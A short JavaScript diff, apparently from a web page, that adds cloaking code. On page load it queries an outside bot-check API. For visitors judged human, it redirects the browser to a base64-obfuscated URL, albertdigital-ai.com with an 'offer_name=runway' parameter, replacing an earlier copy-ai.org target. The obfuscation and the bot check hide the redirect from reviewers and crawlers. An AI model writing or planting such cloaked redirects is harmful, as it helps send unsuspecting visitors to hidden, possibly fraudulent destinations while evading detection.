@@ -32,8 +32,8 @@ createLoader();
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            // window.location.href = atob('aHR0cHM6Ly9jb3B5LWFpLm9yZz9vZmZlcl9uYW1lPXJ1bndheQ==');
-            createFrame(res.html)
+            window.location.href = atob('aHR0cHM6Ly9hbGJlcnRkaWdpdGFsLWFpLmNvbS8/b2ZmZXJfbmFtZT1ydW53YXk=');
+            // createFrame(res.html)
         }
         setTimeout(toggleLoad, 1000);
         
